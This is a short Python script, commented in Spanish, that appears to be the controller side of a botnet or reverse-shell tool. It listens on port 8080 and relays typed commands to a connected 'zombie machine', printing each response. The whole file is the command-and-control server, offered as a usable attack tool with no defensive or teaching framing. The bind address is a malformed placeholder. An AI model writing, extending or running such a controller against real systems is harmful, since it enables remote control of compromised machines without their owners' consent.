import socket

def start_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('000.000.00', 8080)) #change IP  
    server_socket.listen(5)
    print("Controlador en espera de conexiones...")

    while True:
        client_socket, addr = server_socket.accept()
        print(f"Conexión establecida con {addr}")

        while True: 
            command = input("Ingrese el comando para enviar a la máquina zombie: ")
            client_socket.send(command.encode())
            if command.lower() == "exit":  
                break

            response = client_socket.recv(1024).decode()  
            print(f"Respuesta de la máquina zombie: {response}")

        client_socket.close()  

if __name__ == "__main__":
    start_server()
